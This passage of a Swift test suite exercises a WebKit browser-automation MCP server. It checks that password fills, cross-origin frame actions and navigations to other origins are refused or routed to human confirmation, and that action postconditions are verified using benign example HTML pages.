        <button>Send</button>
      </form>
      """,
      baseURL: URL(string: "https://example.test/form"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("submit"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("submit-form-once"),
      "postcondition": .object([
        "type": .string("semantic_text_appears"), "value": .string("Submitted once"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server,
      id: 3,
      name: "browser_act",
      arguments: arguments,
      requestState: try string(required["requestState"]),
      action: "accept",
      confirm: true
    )

    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
  }

  @Test("Password fill and submit-as-click fail before confirmation")
  func formAuthoritySeparation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<form><input type='password' aria-label='Password'><button>Send</button></form>",
      baseURL: URL(string: "https://example.test/account"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let elements = try array(observation["elements"])
    let observationID = try string(observation["observationID"])

    let password = try await toolCall(
      server,
      id: 2,
      name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(observationID),
        "element_id": .string(try string(try object(elements[0])["elementID"])),
        "operation": .string("fill"),
        "value": .string("secret"),
        "approval_mode": .string("mcp"),
        "idempotency_key": .string("blocked-password"),
      ])
    #expect(try object(password["error"])["code"] == .int(-32602))

    let submitAsClick = try await toolCall(
      server,
      id: 3,
      name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(observationID),
        "element_id": .string(try string(try object(elements[1])["elementID"])),
        "operation": .string("click"),
        "approval_mode": .string("mcp"),
        "idempotency_key": .string("wrong-capability"),
        "postcondition": .object([
          "type": .string("url_equals"), "value": .string("https://example.test/done"),
        ]),
      ])
    #expect(try object(submitAsClick["error"])["code"] == .int(-32602))
  }

  @Test(
    "Cross-origin semantics stay labelled and native pointer actions refuse before confirmation")
  func crossOriginActionRefusesBeforeConfirmation() async throws {
    let child = try HistoryFixtureServer()
    let distinctParentOrigin = try HistoryFixtureServer()
    let registry = try WebKitSessionRegistry(runtimeFactory: { _ in
      WebKitRuntime(websiteDataStore: .nonPersistent())
    })
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<title>Parent</title><iframe src='http://127.0.0.1:\(child.port)/child'></iframe>",
      baseURL: URL(string: "http://127.0.0.1:\(distinctParentOrigin.port)/parent"),
      timeout: .seconds(10), quietWindow: .milliseconds(150))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)

    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "compact": .bool(true),
      ])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let embedded = try #require(
      try array(observation["elements"]).compactMap { try? object($0) }.first {
        $0["name"] == .string("Second action")
      })
    let childOrigin = "http://127.0.0.1:\(child.port)"
    #expect(embedded["frame_origin"] == .string(childOrigin))
    #expect(embedded["frame_is_main"] == .bool(false))
    #expect(embedded["bounding_box_coordinate_space"] == .string("frame_viewport"))
    #expect(
      embedded["not_actionable_because"]
        == .string("cross_origin_frame_native_geometry_unavailable"))
    #expect(
      embedded["frame_action_modes"]
        == .array([.string("hover_javascript"), .string("press_key_native_appkit")]))
    #expect(embedded["provenance"] == .array([.string("THIRD_PARTY_EMBED")]))

    let response = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(embedded["elementID"])),
        "operation": .string("click"),
        "idempotency_key": .string("cross-origin-refusal"),
        "postcondition": .object([
          "type": .string("semantic_text_appears"),
          "value": .string("Never dispatched"),
        ]),
      ])
    func requireNamedRefusal(_ response: [String: JSONValue]) throws {
      let result = try object(response["result"])
      let structured = try object(result["structuredContent"])
      #expect(result["isError"] == .bool(true))
      #expect(structured["status"] == .string("cross_origin_native_geometry_unavailable"))
      #expect(structured["code"] == .string("cross_origin_native_geometry_unavailable"))
      #expect(structured["frame_origin"] == .string(childOrigin))
      #expect(structured["dispatched"] == .bool(false))
    }
    try requireNamedRefusal(response)

    let upload = try await toolCall(
      server, id: 3, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(embedded["elementID"])),
        "idempotency_key": .string("cross-origin-upload-refusal"),
        "postcondition": .object([
          "type": .string("semantic_text_appears"),
          "value": .string("Never uploaded"),
        ]),
      ])
    try requireNamedRefusal(upload)

    let download = try await toolCall(
      server, id: 4, name: "browser_download",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(embedded["elementID"])),
        "idempotency_key": .string("cross-origin-download-refusal"),
      ])
    try requireNamedRefusal(download)
    #expect(presenter.requests.isEmpty)
  }

  @Test("Embedded select and hover use child-origin authority and disclose untrusted dispatch")
  func crossOriginScriptActionsThroughMCP() async throws {
    let child = try HistoryFixtureServer(
      responseBody: """
        <!doctype html><title>Child</title>
        <label for='country'>Country</label>
        <select id='country' onchange="document.title='selected:' + this.value">
          <option value='de'>Germany</option><option value='fr'>France</option>
        </select>
        <button aria-label='Hover target'
          onmouseover="document.title='hovered:' + event.isTrusted">Hover</button>
        """)
    let parent = try HistoryFixtureServer()
    let childOrigin = "http://127.0.0.1:\(child.port)"
    let registry = try WebKitSessionRegistry(runtimeFactory: { _ in
      WebKitRuntime(websiteDataStore: .nonPersistent())
    })
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<title>Parent</title><iframe src='\(childOrigin)/controls'></iframe>",
      baseURL: URL(string: "http://127.0.0.1:\(parent.port)/parent"),
      timeout: .seconds(10), quietWindow: .milliseconds(150))
    let presenter = ConfirmationPresenterStub(responses: [true, true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let sessionID = JSONValue.string(handle.rawValue.uuidString)

    let observed = try await toolCall(
      server, id: 1, name: "browser_observe", arguments: ["session_id": sessionID])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let selected = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": sessionID,
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try elementID(in: observation, named: "Country")),
        "operation": .string("select_option"),
        "value": .string("France"),
        "idempotency_key": .string("embedded-country-once"),
      ])
    let selection = try object(try object(selected["result"])["structuredContent"])
    #expect(selection["dispatch_mode"] == .string("javascript"))
    #expect(selection["trusted_gesture_state"] == .string("untrusted_javascript"))
    #expect(try object(selection["verification"])["verified"] != nil)

    let reobserved = try await toolCall(
      server, id: 3, name: "browser_observe", arguments: ["session_id": sessionID])
    let fresh = try object(try object(reobserved["result"])["structuredContent"])
    let hovered = try await toolCall(
      server, id: 4, name: "browser_act",
      arguments: [
        "session_id": sessionID,
        "observation_id": .string(try string(fresh["observationID"])),
        "element_id": .string(try elementID(in: fresh, named: "Hover target")),
        "operation": .string("hover"),
        "idempotency_key": .string("embedded-hover-once"),
      ])
    let hover = try object(try object(hovered["result"])["structuredContent"])
    #expect(hover["dispatch_mode"] == .string("javascript"))
    #expect(hover["trusted_gesture_state"] == .string("untrusted_javascript"))
    #expect(hover["verification"] == .string("not_attempted"))
    #expect(presenter.requests.count == 2)
    #expect(presenter.requests.allSatisfy { $0.message.contains(childOrigin) })
    #expect(presenter.requests.allSatisfy { $0.message.contains("untrusted JavaScript") })
  }

  @Test("Embedded native text actions are confirmed with the child origin and measured trust")
  func crossOriginNativeTextActionsThroughMCP() async throws {
    let child = try HistoryFixtureServer(
      responseBody: """
        <!doctype html><title>Child</title>
        <input aria-label='Key target'
          onkeydown="if(event.key==='Enter') this.dataset.state=event.isTrusted?'trusted':'false'">
        <input aria-label='Fill target'>
        """)
    let parent = try HistoryFixtureServer()
    let childOrigin = "http://127.0.0.1:\(child.port)"
    let registry = try WebKitSessionRegistry(runtimeFactory: { _ in
      WebKitRuntime(websiteDataStore: .nonPersistent())
    })
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<title>Parent</title><iframe src='\(childOrigin)/controls'></iframe>",
      baseURL: URL(string: "http://127.0.0.1:\(parent.port)/parent"),
      timeout: .seconds(10), quietWindow: .milliseconds(150))
    let presenter = ConfirmationPresenterStub(responses: [true, true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let sessionID = JSONValue.string(handle.rawValue.uuidString)

    let observed = try await toolCall(
      server, id: 1, name: "browser_observe", arguments: ["session_id": sessionID])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let pressed = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": sessionID,
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try elementID(in: observation, named: "Key target")),
        "operation": .string("press_key"),
        "key": .string("Enter"),
        "postcondition": .object([
          "type": .string("attribute_equals"), "attribute": .string("data-state"),
          "value": .string("trusted"),
        ]),
        "idempotency_key": .string("embedded-key-once"),
      ])
    let key = try object(try object(pressed["result"])["structuredContent"])
    #expect(key["dispatch_mode"] == .string("native_appkit"))
    #expect(key["trusted_gesture_state"] == .string("trusted"))
    #expect(try object(key["verification"])["verified"] != nil, "key: \(key)")

    let reobserved = try await toolCall(
      server, id: 3, name: "browser_observe", arguments: ["session_id": sessionID])
    let fresh = try object(try object(reobserved["result"])["structuredContent"])
    let filled = try await toolCall(
      server, id: 4, name: "browser_act",
      arguments: [
        "session_id": sessionID,
        "observation_id": .string(try string(fresh["observationID"])),
        "element_id": .string(try elementID(in: fresh, named: "Fill target")),
        "operation": .string("fill"),
        "value": .string("Kevin"),
        "idempotency_key": .string("embedded-fill-once"),
      ])
    let fill = try object(try object(filled["result"])["structuredContent"])
    #expect(fill["dispatch_mode"] == .string("native_appkit"), "fill: \(fill)")
    #expect(fill["trusted_gesture_state"] == .string("trusted"))
    #expect(try object(fill["verification"])["verified"] != nil)
    #expect(presenter.requests.count == 2)
    #expect(presenter.requests.allSatisfy { $0.message.contains(childOrigin) })
  }

  @Test("An option_selected postcondition on a sensitive control is refused with its reason")
  func optionSelectedPostconditionOnSensitiveControlIsRefused() async throws {
    // The control's selected option is withheld from every observation, so this
    // postcondition could never be read back. Left to run it would fail as an
    // unverifiable comparison, which reads to a caller as a page that misbehaved
    // rather than as a rule this product applied on purpose.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label for='delivery'>Where to send the one-time code</label>
      <select id='delivery' name='one-time-code'>
        <option value='mail'>Email</option>
        <option value='sms' selected>Text message</option>
      </select>
      """,
      baseURL: URL(string: "https://example.test/verify"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let delivery = try element(in: observation, named: "Where to send the one-time code")
    // The control is published; only what is chosen in it is not.
    #expect(delivery["selectedOption"] == nil)

    let refused = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(delivery["elementID"])),
        "operation": .string("click"),
        "approval_mode": .string("mcp"),
        "idempotency_key": .string("sensitive-option-postcondition"),
        "postcondition": .object([
          "type": .string("option_selected"), "value": .string("Email"),
        ]),
      ])
    let error = try object(refused["error"])
    #expect(error["code"] == .int(-32602))
    let message = try string(error["message"])
    #expect(message.contains("sensitive"))
    // The refusal names the way through, which is the same way `fill` and
    // `select_option` already name.
    #expect(message.contains("handoff"))
  }

  @Test("A refused click navigation exposes origin-only human recovery in its result and status")
  func refusedClickNavigationNamesHumanRecovery() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button onclick=\"location.href='https://auth.example.test/private-path?state=private-secret'\">Sign in</button>",
      baseURL: URL(string: "https://example.test/login"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    try runtime.requestHumanHandoff()
    try runtime.beginHumanControl(presentWindow: false)
    try runtime.markHumanStepCompleted()
    try runtime.requestAgentResume()
    _ = try await runtime.resumeAfterHumanControl()
    let server = WebKitMCPServer(registry: registry, presentHumanWindows: false)
    let sessionID = JSONValue.string(handle.rawValue.uuidString)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe", arguments: ["session_id": sessionID])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": sessionID,
      "observation_id": observation["observationID"]!,
      "element_id": element["elementID"]!,
      "operation": .string("click"), "approval_mode": .string("mcp"),
      "idempotency_key": .string("refused-login"),
      "postcondition": .object([
        "type": .string("url_contains"), "value": .string("auth.example.test"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let requestState = try string(try object(prepared["result"])["requestState"])
    let acted = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: requestState, action: "accept", confirm: true)
    let result = try object(try object(acted["result"])["structuredContent"])
    let encodedResult = String(
      decoding: try JSONEncoder().encode(JSONValue.object(result)), as: UTF8.self)
    #expect(!encodedResult.contains("private-secret"))
    #expect(!encodedResult.contains("private-path"))
    let blocker = try object(result["navigation_blocker"])
    #expect(blocker["to_origin"] == .string("https://auth.example.test"))
    #expect(blocker["navigation_allowed"] == .bool(false))
    #expect(runtime.webView.url?.host == "example.test")
    let status = try await toolCall(
      server, id: 4, name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": sessionID])
    let state = try object(try object(status["result"])["structuredContent"])
    #expect(state["navigation_blocker"] == result["navigation_blocker"])
    #expect(state["recovery_operation"] == .string("handoff"))
    let encoded = String(decoding: try JSONEncoder().encode(JSONValue.object(state)), as: UTF8.self)
    #expect(!encoded.contains("private-secret"))
    #expect(!encoded.contains("private-path"))
    _ = try await runtime.loadHTML(
      "<button>Recovered</button>", baseURL: URL(string: "https://example.test/recovered"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    #expect(runtime.refusedCrossOriginNavigation() == nil)
  }

  @Test(
    "A filtered baseline cannot prove appearance or absence and refuses before confirmation",
    arguments: ["semantic_text_appears", "target_absent"])
  func filteredBaselineCannotProveNewText(predicate: String) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Open</button><button>Already present</button>",
      baseURL: URL(string: "https://example.test/filtered"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let session = JSONValue.string(handle.rawValue.uuidString)
    let response = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: [
        "session_id": session, "name_contains": .string("Open"),
      ])
    let observation = try object(try object(response["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let attempted = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": observation["observationID"]!,
        "element_id": target["elementID"]!, "operation": .string("click"),
        "approval_mode": .string("native"), "idempotency_key": .string("filtered-false-positive"),
        "postcondition": .object([
          "type": .string(predicate),
          "value": .string(predicate == "target_absent" ? "true" : "Already present"),
        ]),
      ])
    let error = try object(attempted["error"])
    let message = try string(error["message"])
    #expect(message.contains("postcondition_baseline_incomplete"))
    #expect(message.contains("do not retry the same global condition"))
    #expect(message.contains("heading_contains"))
    #expect(message.contains("target-local state"))
    #expect(presenter.requests.isEmpty)
  }

  @Test("A confirmed MCP click verifies newly appearing same-page semantic text")
  func semanticPostconditionActuation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button aria-label="Save" onclick="
        const status = document.createElement('div');
        status.setAttribute('role', 'status');
        status.textContent = 'Saved locally';
        document.body.appendChild(status);
      ">Save</button>
      """,
      baseURL: URL(string: "https://example.test/settings")
    )
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("semantic-save-once"),
      "postcondition": .object([
        "type": .string("semantic_text_appears"),
        "value": .string("Saved locally"),
      ]),
    ]
    let prepared = try await toolCall(
      server, id: 2, name: "browser_act", arguments: arguments)
    let requestState = try string(try object(prepared["result"])["requestState"])
    let accepted = try await call(
      server,
      id: 3,
      method: "tools/call",
      params: .object([
        "name": .string("browser_act"),
        "arguments": .object(arguments),
        "requestState": .string(requestState),
        "inputResponses": .object([
          "confirmation": .object([
            "action": .string("accept"),
            "content": .object(["confirm": .bool(true)]),
          ])
        ]),
      ]),
      modern: true
    )

    let result = try object(accepted["result"])
    #expect(result["resultType"] == .string("complete"))
    let structured = try object(result["structuredContent"])
    #expect(structured["verification"] != nil)
  }

  @Test("Page title partial postconditions are parsed and verified")
  func pageTitlePartialPostcondition() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <title>Edit Identifier</title>
      <button aria-label="Continue" onclick="document.title='Saved Identifier'">
        Continue
      </button>
      """,
      baseURL: URL(string: "https://example.test/identifiers/edit")
    )
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("title-change-once"),
      "postcondition": .object([
        "type": .string("title_contains"), "value": .string("Saved"),
      ]),
    ]
    let prepared = try await toolCall(
      server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
  }

  @Test("A route-changing click verifies against the fresh observed URL")
  func urlChangePostcondition() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let initialURL = "https://example.test/identifiers/list"
    runtime.webView.loadHTMLString(
      """
      <div role="button" aria-label="Halte com.lorislab.halte"
        onclick="history.pushState({}, '', '/identifiers/bundleId/edit/47992K4235')">
        Halte com.lorislab.halte
      </div>
      """,
      baseURL: URL(string: initialURL))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("route-change-once"),
      "postcondition": .object([
        "type": .string("url_changes_from"), "value": .string(initialURL),
      ]),
    ]
    let prepared = try await toolCall(
      server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    let verification = try object(structured["verification"])
    #expect(verification["verified"] != nil)
    #expect(runtime.agentSafeCurrentURL()?.hasSuffix("/bundleId/edit/47992K4235") == true)
  }

  @Test("A same-document wizard step verifies from its fresh heading")
  func headingPostcondition() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <h1>Create a Provisioning Profile</h1>
      <button onclick="
        const heading = document.querySelector('h1');
        if (heading.textContent === 'Create a Provisioning Profile') {
          heading.textContent='Select Certificates'; this.textContent='Generate';
        } else { heading.textContent='Download'; }
      ">
        Continue
      </button>
      """,
      baseURL: URL(string: "https://example.test/account/resources/profiles/add"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try #require(try array(observation["elements"]).last)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(try object(target)["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("wizard-heading-once"),
      "postcondition": .object([
        "type": .string("heading_equals"), "value": .string("Select Certificates"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)

    let refreshedCall = try await toolCall(
      server, id: 4, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let refreshed = try object(try object(refreshedCall["result"])["structuredContent"])
    let generate = try #require(try array(refreshed["elements"]).last)
    let generateArguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(refreshed["observationID"])),
      "element_id": .string(try string(try object(generate)["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("wizard-generate-heading-once"),
      "postcondition": .object([
        "type": .string("heading_equals"), "value": .string("Download"),
      ]),
    ]
    let generatePrepared = try await toolCall(
      server, id: 5, name: "browser_act", arguments: generateArguments)
    let generateRequired = try object(generatePrepared["result"])
    let generated = try await roundTripToolCall(
      server, id: 6, name: "browser_act", arguments: generateArguments,
      requestState: try string(generateRequired["requestState"]), action: "accept", confirm: true)
    let generatedStructured = try object(try object(generated["result"])["structuredContent"])
    #expect(try object(generatedStructured["verification"])["verified"] != nil)
  }

  @Test(
    "A disappearing control verifies absence or explains an unsuitable enabled predicate",
    arguments: ["target_absent", "enabled_equals", "target_absent_partial"])
  func disappearingControlPostcondition(predicate: String) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let partial = predicate == "target_absent_partial"
    let postconditionType = partial ? "target_absent" : predicate
    let remainingControls = partial ? String(repeating: "<button>Other</button>", count: 205) : ""
    _ = try await runtime.loadHTML(
      "<button onclick='this.remove()'>Enregistrer</button>" + remainingControls,
      baseURL: URL(string: "https://example.test/encryption"))
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString), "maximum_elements": .int(300)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try #require(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(try object(target)["elementID"])),
      "operation": .string("click"), "approval_mode": .string("mcp"),
      "idempotency_key": .string("disappearing-control-" + predicate),
      "postcondition": .object([
        "type": .string(postconditionType),
        "value": .string(postconditionType == "target_absent" ? "true" : "false"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    let verification = try object(structured["verification"])
    if predicate == "target_absent" {
      #expect(verification["verified"] != nil)
    } else {
      #expect(verification["indeterminate"] != nil)
      #expect(structured["action_state"] == .string("dispatched_verification_indeterminate"))
      #expect(structured["action_replayed"] == .bool(false))
      #expect(try string(structured["safe_next_step"]).contains("never replay"))
    }
  }

  @Test("A same-URL mutation explains an indeterminate URL postcondition")
  func sameURLMutationDiagnostic() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let initialURL = "https://example.test/account/resources/profiles/add"
    runtime.webView.loadHTMLString(
      "<h1>Start</h1><button onclick=\"document.querySelector('h1').textContent='Profile Name'\">Continue</button>",
      baseURL: URL(string: initialURL))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try #require(try array(observation["elements"]).last)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(try object(target)["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("same-url-diagnostic-once"),
      "postcondition": .object([
        "type": .string("url_changes_from"), "value": .string(initialURL),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(structured["diagnostic"]?.stringValue == "same_url_page_state_changed")
    #expect(try array(structured["suggested_postconditions"]).contains(.string("heading_equals")))
  }

  @Test("A confirmed checkbox click verifies semantic checked state")
  func verifiedCheckedState() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label style='display:inline-block; padding:8px'>
        <input style='position:absolute; opacity:0' type='checkbox'> View financial data
      </label>
      """,
      baseURL: URL(string: "https://example.test/permissions"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("check-financial-data-once"),
      "postcondition": .object([
        "type": .string("checked_equals"), "value": .string("true"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
  }

  @Test("A Save action proves the Confirm dialog and exposes a no-replay modal hint")
  func saveThenConfirmDialog() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button aria-label="Save" onclick="
        this.dataset.dispatchCount = String(Number(this.dataset.dispatchCount || '0') + 1);
        const dialog = document.createElement('div');
        dialog.setAttribute('role', 'dialog');
        dialog.setAttribute('aria-label', 'Confirm');
